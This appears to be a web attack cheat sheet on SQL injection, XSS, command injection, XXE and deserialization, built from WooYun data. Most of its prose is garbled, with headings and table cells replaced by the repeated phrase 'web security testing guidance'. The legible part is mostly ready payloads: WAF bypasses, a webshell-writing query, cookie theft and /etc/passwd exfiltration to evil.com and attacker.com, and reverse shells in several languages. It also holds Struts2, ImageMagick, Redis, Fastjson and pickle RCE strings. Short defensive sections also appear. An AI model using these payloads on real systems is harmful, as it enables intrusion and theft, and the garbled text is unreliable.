# Webweb security testing guidance

> web security testing guidanceWooYunweb security testing guidance：SQLweb security testing guidance(27,732web security testing guidance)、XSS(7,532web security testing guidance)、web security testing guidance(6,826web security testing guidance)
> web security testing guidance：wooyun_vulnerabilities.json (88,636web security testing guidance, 2010-2016)
> web security testing guidance

---

## web security testing guidance、SQLweb security testing guidance

### 1.1 web security testing guidance

```
web security testing guidance → web security testing guidanceSQLweb security testing guidance → web security testing guidance → web security testing guidance
```

**web security testing guidance**：SQLweb security testing guidance = web security testing guidance + web security testing guidanceSQLweb security testing guidance

### 1.2 web security testing guidance

#### web security testing guidance

| web security testing guidance | web security testing guidance | web security testing guidance |
|---------|------|---------|
| web security testing guidance | 66% | web security testing guidance/web security testing guidance |
| web security testing guidance | 64% | LIKEweb security testing guidance |
| POSTweb security testing guidance | 60% | web security testing guidance |
| HTTPweb security testing guidance | 26% | UA/Referer/XFF |
| GETweb security testing guidance | 24% | URLweb security testing guidance |
| Cookie | 12% | web security testing guidance |

**web security testing guidance**：`id`, `sort_id`, `username`, `password`, `type`, `action`, `page`, `name`；ASP.NETweb security testing guidance：`__viewstate`, `__eventvalidation`

#### web security testing guidance

```
1. web security testing guidance/web security testing guidance → web security testing guidance
2. web security testing guidance: id=2-1 / id=1*1 → web security testing guidance
3. web security testing guidance: and 1=1 / and 1=2 → web security testing guidance
4. web security testing guidance: and sleep(5) → web security testing guidance
5. web security testing guidance: order by N → web security testing guidance
```

#### web security testing guidance

| web security testing guidance | web security testing guidance | web security testing guidance | web security testing guidance |
|-------|---------|-------|---------|
| MySQL | `sleep(N)` / `benchmark()` | `information_schema.tables` | "You have an error in your SQL syntax" |
| MSSQL | `WAITFOR DELAY '0:0:N'` | `sysobjects` | "Unclosed quotation mark" |
| Oracle | `dbms_pipe.receive_message('a',N)` | `all_tables` | "ORA-00942" |
| Access | web security testing guidance | `MSysObjects` | "Microsoft JET Database Engine" |

### 1.3 web security testing guidancePayload

#### web security testing guidance

```sql
id=1 AND 1=1    -- True
id=1 AND 1=2    -- False
id=1' AND '1'='1
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### web security testing guidance

```sql
-- MySQL（web security testing guidance）
id=(select(2)from(select(sleep(8)))v)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

#### web security testing guidance

```sql
id=1 ORDER BY N--              -- web security testing guidance
id=-1 UNION SELECT 1,2,3,4,5--  -- web security testing guidance
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### web security testing guidance

```sql
-- MySQL extractvalue/updatexml
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
-- MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
-- CHARweb security testing guidance
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+(SELECT CHAR(49))+CHAR(113))) AND 'a'='a
```

### 1.4 WAF/web security testing guidance

#### web security testing guidance（web security testing guidance）

```sql
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3
-- DeDeCMSweb security testing guidance
/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x7C,userid,0x3a,pwd,0x7C),5,6,7,8,9+from+`#@__admin`#
```

#### web security testing guidance

```sql
-- web security testing guidance: 'admin' -> 0x61646d696e
SELECT * FROM users WHERE name=0x61646d696e
-- URLweb security testing guidance: %252f -> / , %2527 -> '
-- Unicode: %u0027 -> '
```

#### web security testing guidance + web security testing guidance

```sql
UnIoN SeLeCt                    -- web security testing guidance
UNION/**/SELECT/**/1,2,3        -- web security testing guidance
UNION%09SELECT                  -- Tabweb security testing guidance
UNION%0ASELECT                  -- web security testing guidance
```

#### web security testing guidance

```sql
SUBSTRING -> MID / SUBSTR / LEFT / RIGHT
CONCAT -> CONCAT_WS / ||
CHAR(65) -> web security testing guidanceA
```

#### web security testing guidance

```sql
AND 1=1 -> && 1=1 -> & 1
OR 1=1  -> || 1=1 -> | 1
id=1 -> id LIKE 1 / id BETWEEN 1 AND 1 / id IN(1) / id REGEXP '^1$'
-- web security testing guidance
'admin' -> CHAR(97,100,109,105,110) -> 0x61646d696e
```

#### web security testing guidance（GBKweb security testing guidance）

```
%bf%27 web security testing guidance addslashes()   -- GBKweb security testing guidance
```

#### HTTPweb security testing guidance

```
web security testing guidance: id=1&id=2             -- web security testing guidance
web security testing guidance: Transfer-Encoding: chunked
X-Forwarded-Forweb security testing guidance / Cookieweb security testing guidance  -- web security testing guidance
```

### 1.5 web security testing guidance

#### MySQLweb security testing guidance

```sql
-- 1.web security testing guidance -> 2.web security testing guidance -> 3.web security testing guidance -> 4.web security testing guidance -> 5.web security testing guidance -> 6.web security testing guidance -> 7.Shell
union select 1,database(),version(),user(),5--
union select 1,group_concat(schema_name),3 from information_schema.schemata--
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--
union select 1,group_concat(username,0x3a,password),3 from users--
union select 1,load_file('/etc/passwd'),3--
union select 1,'< php @system($_POST[cmd]); >',3 into outfile '/var/www/html/shell.php'--
```

#### MSSQLweb security testing guidance

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,username+':'+password,3 from users--
-- web security testing guidance（web security testing guidancesaweb security testing guidance）
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
exec master..xp_cmdshell 'whoami'--
```

#### Oracleweb security testing guidance

```sql
union select banner,null from v$version where rownum=1--
union select table_name,null from all_tables where rownum<=10--
union select username||':'||password,null from users--
```

#### Accessweb security testing guidance

```sql
-- web security testing guidanceinformation_schema，web security testing guidance
id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97
-- web security testing guidanceNOT IN
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

### 1.6 web security testing guidance

```python
# web security testing guidance（web security testing guidance）
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))  # Python
```

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id =  ");        // PHP PDO
```

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id =  "); // Java
```

- web security testing guidance/web security testing guidance（web security testing guidance）、web security testing guidance（web security testing guidance）
- web security testing guidance + web security testing guidance
- web security testing guidance + web security testing guidance + WAFweb security testing guidance

---

## web security testing guidance、XSSweb security testing guidance

### 2.1 web security testing guidance

```
web security testing guidance(web security testing guidance) -> web security testing guidance -> web security testing guidance -> web security testing guidance
```

**web security testing guidance**：XSS = web security testing guidance + web security testing guidance（web security testing guidanceHTML/JS/CSS/URLweb security testing guidance）

### 2.2 web security testing guidance

#### web security testing guidance

| web security testing guidance | web security testing guidance | web security testing guidance |
|-------|---------|---------|
| web security testing guidance/web security testing guidance | web security testing guidance | web security testing guidance、web security testing guidance、web security testing guidance |
| web security testing guidance | web security testing guidance | web security testing guidance |
| web security testing guidance/web security testing guidance | web security testing guidance | web security testing guidance、web security testing guidance、web security testing guidance |
| web security testing guidance/web security testing guidance | web security testing guidance | web security testing guidance、web security testing guidance |
| web security testing guidance/web security testing guidance | web security testing guidance | web security testing guidance |
| web security testing guidance | web security testing guidance | web security testing guidance、web security testing guidance |

**web security testing guidance**（web security testing guidance）：HTTPweb security testing guidance(XFF/UAweb security testing guidance)、WAPweb security testing guidancePCweb security testing guidance、web security testing guidanceWebweb security testing guidance、web security testing guidance/web security testing guidance

#### web security testing guidance

```
web security testing guidance <script> web security testing guidance？ -> JSweb security testing guidance（web security testing guidance）
web security testing guidance？    -> web security testing guidance（web security testing guidance）
web security testing guidance？  -> HTMLweb security testing guidance（web security testing guidancetextarea/title）
web security testing guidanceURLweb security testing guidance？       -> URLweb security testing guidance（web security testing guidance）
web security testing guidanceCSSweb security testing guidance？       -> CSSweb security testing guidance（web security testing guidanceexpressionweb security testing guidance）
```

### 2.3 web security testing guidancePayload

#### HTMLweb security testing guidance

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### HTMLweb security testing guidance

```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### JavaScriptweb security testing guidance

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### URLweb security testing guidance

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2.4 WAF/web security testing guidance

#### web security testing guidance

```html
<!-- HTMLweb security testing guidance -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
<!-- Base64 + dataweb security testing guidance -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- CSSweb security testing guidance(IE) -->
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

#### web security testing guidance/web security testing guidance

```html
<ScRiPt>alert(1)</sCrIpT>              <!-- web security testing guidance -->
<script/src=//xss.com/x.js>            <!-- web security testing guidance -->
<img src=x onerror=alert(1)>           <!-- web security testing guidance -->
<scrscriptipt>alert(1)</scrscriptipt>  <!-- web security testing guidance -->
<scr\x00ipt>alert(1)</script>          <!-- web security testing guidance -->
```

#### web security testing guidance

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

#### WAFweb security testing guidance

```html
.<script src=http://localhost/1.js>.    <!-- web security testing guidance：web security testing guidance -->
<!--[if true]><img onerror=alert(1) src=--> <!-- web security testing guidance -->
```

#### web security testing guidance

```html
<script src=//xss.pw/j>                <!-- web security testing guidance -->
<!-- DOMweb security testing guidance -->
<script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
<!-- web security testing guidance -->
<script>window['al'+'ert'](1)</script>
<!-- fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### HTTPOnlyweb security testing guidance

- Flashweb security testing guidanceCookie
- web security testing guidanceCSRFweb security testing guidance：web security testing guidance（web security testing guidance、web security testing guidance、web security testing guidancetoken）

### 2.5 web security testing guidance

#### Cookieweb security testing guidance

```html
<script>new Image().src="https://evil.com/c ="+document.cookie</script>
<img src=x onerror="new Image().src='https://evil.com/c ='+document.cookie">
<script>fetch('https://evil.com/c ='+document.cookie)</script>
```

#### DOM XSSweb security testing guidance

**web security testing guidance**：`location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`

**web security testing guidance**：`innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`

#### XSSweb security testing guidance

```javascript
// 1.web security testing guidance(cookie/token)
// 2.web security testing guidancepayloadweb security testing guidance
// 3.web security testing guidance/web security testing guidance（AJAX POST）
// 4.web security testing guidance：web security testing guidance/web security testing guidance
function worm(){
    jQuery.post("/api/post", {"content": "<web security testing guidancepayload>"})
}
worm()
```

#### web security testing guidance

```
XSS + CSRF -> web security testing guidanceTokenweb security testing guidance
XSS + SQLi -> web security testing guidanceCookie -> web security testing guidance
XSS -> web security testing guidance -> web security testing guidance -> web security testing guidance
XSSweb security testing guidance(web security testing guidance/web security testing guidance/web security testing guidance) -> web security testing guidanceCookie
```

### 2.6 web security testing guidance

- **web security testing guidance**（web security testing guidance）：HTMLweb security testing guidanceHTMLweb security testing guidance，JSweb security testing guidanceJSweb security testing guidance，URLweb security testing guidanceURLweb security testing guidance
- CSPweb security testing guidance
- HTTPOnlyweb security testing guidanceCookie
- web security testing guidance（web security testing guidance，web security testing guidance）
- **web security testing guidance**：web security testing guidancescriptweb security testing guidance、web security testing guidance、web security testing guidance、web security testing guidance

---

## web security testing guidance、web security testing guidance

### 3.1 web security testing guidance

```
web security testing guidance(web security testing guidance) -> web security testing guidance -> web security testing guidance/web security testing guidance -> OSweb security testing guidance
```

**web security testing guidance**：web security testing guidance = web security testing guidance + web security testing guidance（Shell/web security testing guidance/web security testing guidance）

### 3.2 web security testing guidance

#### web security testing guidance

| web security testing guidance | web security testing guidance | web security testing guidance |
|---------|------|---------|
| web security testing guidance | 68% | web security testing guidance、web security testing guidance、web security testing guidance |
| web security testing guidance | 62% | exec/system/shell_exec |
| Struts2web security testing guidance | 50% | OGNLweb security testing guidance |
| SSRF | 30% | URLweb security testing guidance |
| pingweb security testing guidance | 26% | web security testing guidance |
| web security testing guidance | 24% | ImageMagick |
| Javaweb security testing guidance | 20% | WebLogic/JBoss |

#### web security testing guidance

| web security testing guidance | web security testing guidance | web security testing guidance |
|------|------|---------|
| `;` | web security testing guidance | web security testing guidance，web security testing guidance |
| `\|` | web security testing guidance | web security testing guidance |
| `` ` `` / `$()` | web security testing guidance | web security testing guidance |
| `\|\|` | web security testing guidance | web security testing guidance |
| `&&` | web security testing guidance | web security testing guidance |
| `%0a` / `%0d%0a` | web security testing guidance | URLweb security testing guidance |

#### web security testing guidance

```bash
# DNSLogweb security testing guidance
ping `whoami`.xxxxx.ceye.io
curl http://`whoami`.xxxxx.ceye.io

# HTTPweb security testing guidance
curl https://evil.com/ d=`cat /etc/passwd | base64 | tr '\n' '-'`
curl -X POST -d "data=$(cat /etc/passwd)" https://evil.com/c

# web security testing guidance
sleep 5
ping -c 5 127.0.0.1

# web security testing guidanceWebweb security testing guidance
echo "test" > /var/www/html/proof.txt
```

### 3.3 web security testing guidance

#### web security testing guidance

```bash
cat${IFS}/etc/passwd          # ${IFS}web security testing guidance
cat$IFS$9/etc/passwd          # $9web security testing guidance
cat%09/etc/passwd             # Tabweb security testing guidance
cat</etc/passwd               # web security testing guidance
{cat,/etc/passwd}             # web security testing guidance
```

#### web security testing guidance

```bash
# web security testing guidance/web security testing guidance
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# web security testing guidance
a=c;b=at;$a$b /etc/passwd

# web security testing guidance
/bin/ca* /etc/passwd
/bin/c t /etc/passwd
/   /  t /etc/passwd
```

#### catweb security testing guidance

```bash
tac  head  tail  more  less  nl  sort  uniq  od -c  xxd  base64  rev  paste
```

#### web security testing guidance

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### 3.4 web security testing guidancePayload

#### web security testing guidance/web security testing guidancePayload

**ImageMagick (CVE-2016-3714)**：

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/ATTACKER/8080 0>&1 &")'
pop graphic-context
```

**Struts2 S2-045**：

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

**Struts2 OGNLweb security testing guidance**：

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

**ElasticSearch Groovyweb security testing guidance**：

```json
{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

**Redisweb security testing guidanceSSHweb security testing guidance/Crontab**：

```bash
redis-cli -h target
config set dir /root/.ssh && config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n" && save
# web security testing guidancecrontab
config set dir /var/spool/cron && config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/8080 0>&1\n\n" && save
```

#### web security testing guidanceShellweb security testing guidance

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# NCweb security testing guidance-eweb security testing guidance
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}
```

#### PHPweb security testing guidance

| web security testing guidance | web security testing guidance | web security testing guidance |
|-----|------|-----|
| L1web security testing guidance | `eval()`, `assert()(PHP5)`, `create_function()`, `preg_replace(/e)` | PHPweb security testing guidance |
| L2 Shellweb security testing guidance | `system()`, `passthru()`, `shell_exec()`, web security testing guidance | web security testing guidance |
| L3web security testing guidance | `exec()`, `popen()`, `proc_open()`, `pcntl_exec()` | web security testing guidance |
| L4web security testing guidance | `call_user_func()`, `array_map()` | web security testing guidance |

#### PHP WAFweb security testing guidance

```php
// web security testing guidance
$func = 'sys'.'tem'; $func('whoami');
// web security testing guidance
$a='sys';$b='tem';($a.$b)('whoami');
// web security testing guidance
base64_decode('c3lzdGVt')           // system
str_rot13('flfgrz')                 // system
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) // system
// web security testing guidance
strrev('metsys')('whoami');
implode('',array('s','y','s','t','e','m'))('whoami');
```

#### disable_functionsweb security testing guidance

| web security testing guidance | web security testing guidance | web security testing guidance |
|-----|------|-----|
| LD_PRELOAD | web security testing guidance，mail()web security testing guidance.so | web security testing guidance.so + mail()web security testing guidance |
| Shellshock | Bash<=4.3web security testing guidance | web security testing guidanceBash |
| Apache Mod_CGI | .htaccessweb security testing guidanceCGIweb security testing guidance | Apache + AllowOverride |
| PHP-FPM/FastCGI | web security testing guidancePHPweb security testing guidance | web security testing guidanceFPMweb security testing guidance/SSRF |
| ImageMagick | delegateweb security testing guidance | web security testing guidanceIMweb security testing guidance |
| Windows COM | WScript.Shellweb security testing guidance | Windows + COMweb security testing guidance |

**LD_PRELOADweb security testing guidance**：

```php
// web security testing guidance.so（web security testing guidancegeteuidweb security testing guidance，web security testing guidancesystem()）
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("a@a.com","test","test");  // mail()web security testing guidancesendmailweb security testing guidance -> web security testing guidance.so -> web security testing guidance
```

### 3.5 web security testing guidance

```php
// web security testing guidance：web security testing guidance + escapeshellarg
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    system("ping " . escapeshellarg($_GET['ip']));
}
```

- web security testing guidance，web security testing guidance
- web security testing guidance（web security testing guidance），web security testing guidance
- `escapeshellarg()` + `escapeshellcmd()` web security testing guidance
- web security testing guidance + web security testing guidance
- `disable_functions` web security testing guidance（web security testing guidance）
- web security testing guidanceWebweb security testing guidance + web security testing guidance/chrootweb security testing guidance
- web security testing guidance（Struts2/WebLogic/ImageMagickweb security testing guidance）

---

## web security testing guidance、XXE (XMLweb security testing guidance)

### 4.1 web security testing guidance

```
XMLweb security testing guidance -> web security testing guidanceDTD/web security testing guidance -> web security testing guidance -> web security testing guidance/SSRF/RCE
```

**web security testing guidance**：XXE = XMLweb security testing guidance + web security testing guidanceXMLweb security testing guidance

### 4.2 web security testing guidance

**web security testing guidance**

| web security testing guidance | web security testing guidance | web security testing guidance |
|----------|----------|----------|
| APIweb security testing guidance | Content-Typeweb security testing guidance`text/xml`web security testing guidance`application/xml` | RESTful API、SOAP Webweb security testing guidance |
| web security testing guidance | SVGweb security testing guidance、DOCX/XLSX/PPTX(web security testing guidanceZIPweb security testing guidanceXML) | web security testing guidance、web security testing guidance |
| web security testing guidance | XMLweb security testing guidance、RSS/Atomweb security testing guidance | web security testing guidance、web security testing guidance |
| web security testing guidance | SAMLweb security testing guidance、WebDAV、XMPP | SSOweb security testing guidance、web security testing guidance |

**web security testing guidance**

```
1. web security testing guidanceXMLweb security testing guidance → web security testing guidanceContent-Typeweb security testing guidanceapplication/xmlweb security testing guidance
2. web security testing guidanceDTDweb security testing guidance → web security testing guidance(web security testing guidance)
3. web security testing guidance → fileweb security testing guidance
4. web security testing guidance → OOBweb security testing guidance(DNS/HTTPweb security testing guidance)
```

### 4.3 web security testing guidancePayload

#### web security testing guidance（web security testing guidance）

```xml
< xml version="1.0" encoding="UTF-8" >
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### SSRFweb security testing guidance

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

#### web security testing guidance - OOBweb security testing guidance

```xml
<!-- web security testing guidanceDTD (attackerweb security testing guidanceevil.dtd) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- evil.dtdweb security testing guidance: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/ d=%file;'>">
%eval;
%exfil;
```

#### web security testing guidance

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %e;
]>
```

### 4.4 web security testing guidance

| web security testing guidance | web security testing guidance | web security testing guidance |
|----------|------|----------|
| web security testing guidance | UTF-16BE/LE、UTF-7web security testing guidanceXML | WAFweb security testing guidanceASCIIweb security testing guidance |
| web security testing guidance | `%entity;`web security testing guidance`&entity;` | web security testing guidance`&` |
| XInclude | `<xi:include href="file:///etc/passwd"/>` | web security testing guidanceDOCTYPEweb security testing guidance |
| SVGweb security testing guidance | SVGweb security testing guidanceXXEweb security testing guidance | web security testing guidance |
| DOCX/XLSXweb security testing guidance | web security testing guidanceOfficeweb security testing guidance`[Content_Types].xml` | web security testing guidance |
| CDATAweb security testing guidance | web security testing guidanceCDATAweb security testing guidance | web security testing guidanceXMLweb security testing guidance |

### 4.5 web security testing guidance

```java
// Java: web security testing guidanceDTDweb security testing guidance
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

- web security testing guidanceDTDweb security testing guidance（web security testing guidance）
- web security testing guidanceJSONweb security testing guidanceXMLweb security testing guidance
- web security testing guidance、web security testing guidanceXMLweb security testing guidance
- WAFweb security testing guidance`<!DOCTYPE`/`<!ENTITY`/`SYSTEM`web security testing guidance

---

## web security testing guidance、web security testing guidance

### 5.1 web security testing guidance

```
web security testing guidance(web security testing guidance) -> web security testing guidance -> web security testing guidance/web security testing guidance -> web security testing guidance
```

**web security testing guidance**：web security testing guidanceRCE = web security testing guidance + web security testing guidanceclasspath/web security testing guidance + web security testing guidance(Gadget Chain)

### 5.2 Javaweb security testing guidance

**web security testing guidance**

```
web security testing guidance: AC ED 00 05 (hexweb security testing guidance)
Base64:   rO0AB (web security testing guidance)
web security testing guidance: Cookie、ViewState、JMX、RMI、T3web security testing guidance、HTTP Body
```

**web security testing guidance**

| web security testing guidance | web security testing guidance | web security testing guidance | web security testing guidance |
|--------|--------|----------|------|
| Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
| Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
| Fastjson | fastjson < 1.2.68 | `@type` autoType | web security testing guidance/web security testing guidance |
| Jackson | jackson-databind | web security testing guidance | ysoserial |
| JNDIweb security testing guidance | JDK < 8u191 | LDAP/RMIweb security testing guidance | JNDIExploit/marshalsec |

**Fastjsonweb security testing guidancePayload**

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// 1.2.47 web security testing guidance
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
```

**web security testing guidance**

```bash
# ysoserialweb security testing guidancepayload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# JNDIweb security testing guidance
java -jar JNDIExploit.jar -i attacker_ip

# marshalsecweb security testing guidanceLDAP/RMI
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
```

### 5.3 PHPweb security testing guidance

**web security testing guidance**

```
web security testing guidance: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
web security testing guidance: unserialize(), phar://web security testing guidance
```

**web security testing guidance**

| web security testing guidance | web security testing guidance | web security testing guidance |
|------|----------|----------|
| `__wakeup()` | unserialize()web security testing guidance | web security testing guidance→web security testing guidance |
| `__destruct()` | web security testing guidance | web security testing guidance/web security testing guidance/web security testing guidance |
| `__toString()` | web security testing guidance | web security testing guidance |
| `__call()` | web security testing guidance | web security testing guidance |

**POPweb security testing guidance**

```
1. web security testing guidance: __wakeup()/__destruct() web security testing guidance$this->xxxweb security testing guidance
2. web security testing guidance: web security testing guidance__toString()/__call()/__get() web security testing guidance
3. web security testing guidance: web security testing guidancesystem()/eval()/file_put_contents()web security testing guidance
4. web security testing guidance: web security testing guidance
```

**Pharweb security testing guidance（web security testing guidanceunserializeweb security testing guidance）**

```php
// web security testing guidancephar://web security testing guidance
file_exists('phar://upload/evil.phar');
is_dir('phar://upload/evil.jpg');      // web security testing guidance
```

### 5.4 Pythonweb security testing guidance

**web security testing guidance**

```python
import pickle, yaml, marshal

# pickle - web security testing guidance
pickle.loads(data)      # web security testing guidance
pickle.load(file)       # web security testing guidance

# yaml - web security testing guidanceLoader
yaml.load(data)         # web security testing guidance(web security testing guidance)
yaml.load(data, Loader=yaml.FullLoader)  # web security testing guidance

# marshal - web security testing guidance
marshal.loads(data)     # web security testing guidance
```

**pickle RCE Payload**

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# web security testing guidance:
# pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
```

**yaml RCE Payload**

```yaml
!!python/object/apply:os.system ['whoami']
# web security testing guidance
!!python/object/new:subprocess.check_output [['whoami']]
```

### 5.5 web security testing guidance

```java
// Java: ObjectInputStreamweb security testing guidance
ObjectInputStream ois = new ObjectInputStream(input) {
    @Override protected Class< > resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
        return super.resolveClass(desc);
    }
};
```

- **Java**: web security testing guidance(Fastjson/Jackson/Commons-Collections)、web security testing guidanceautoType、web security testing guidance
- **PHP**: web security testing guidanceunserialize()web security testing guidance、web security testing guidancejson_decodeweb security testing guidance、web security testing guidancephar://web security testing guidance
- **Python**: web security testing guidance`yaml.safe_load()`web security testing guidance`yaml.load()`、web security testing guidancepickleweb security testing guidance、web security testing guidanceJSON
- **web security testing guidance**: web security testing guidance，web security testing guidanceJSON；web security testing guidance/HMACweb security testing guidance

---

## web security testing guidance：SQLMapweb security testing guidance

```bash
# web security testing guidance
sqlmap -u "http://t/p.php id=1" --batch
# POSTweb security testing guidance
sqlmap -u "http://t/login.php" --data="user=t&pass=t" --batch
# Cookie/HTTPweb security testing guidance
sqlmap -u "http://t/p.php" --cookie="id=1" --level=2 --batch
sqlmap -u "http://t/p.php" --headers="X-Forwarded-For: 1" --level=3 --batch
# web security testing guidanceWAF
sqlmap -u "http://t/p.php id=1" --tamper=space2comment,between --batch
# web security testing guidance
sqlmap ... --dbs
sqlmap ... -D db --tables
